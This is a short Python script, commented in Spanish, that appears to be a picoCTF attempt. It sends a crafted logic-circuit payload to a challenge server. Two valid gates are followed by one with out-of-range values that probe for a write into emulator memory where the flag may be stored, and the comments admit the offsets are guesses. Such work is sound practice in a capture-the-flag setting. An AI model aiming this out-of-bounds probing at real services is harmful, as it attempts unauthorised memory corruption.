import requests

# Este payload intenta apuntar a una dirección de memoria 
# que el emulador usa para mapear las señales de salida.
# 0x3000 es el inicio de tu control de escritura.
# Si el emulador usa el rango 0x3000-0xFFFF, quizás la señal de FLAG
# esté en un offset predecible.

circuit = [
    # Puertas lógicas normales para pasar la validación inicial
    {"input1": 5, "input2": 5, "output": 1},
    {"input1": 6, "input2": 6, "output": 2},
    
    # Intento de escritura en un rango sospechoso (probando offsets)
    # Algunos emuladores mapean las señales justo después de los datos
    {"input1": 0xFFFF, "input2": 0xFFFF, "output": 0x4000} 
]

url = "http://activist-birds.picoctf.net:50108/check"
response = requests.post(url, json={"circuit": circuit})
print(response.json())
